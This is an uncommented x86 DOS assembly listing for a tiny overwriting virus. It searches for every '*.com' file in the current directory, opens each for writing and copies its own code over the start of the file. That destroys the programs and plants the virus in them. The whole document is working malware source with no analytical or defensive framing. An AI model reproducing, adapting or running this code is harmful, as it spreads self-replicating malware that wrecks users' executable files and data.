Main:
                Mov Ah,4eh
On1:            Lea Dx,FileSpec
                Int 21h
                Jc Ende
                Mov Ax,3d01h
                Mov Dx,9eh
                Int 21h
                Mov Bh,40h
                Lea Dx,Main
                Xchg Ax,Bx
                Mov Cl,Length
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ah,4fh
                Jmp On1
FileSpec        Db '*.com',0
Ende:           Ret
Length          Equ $-Main
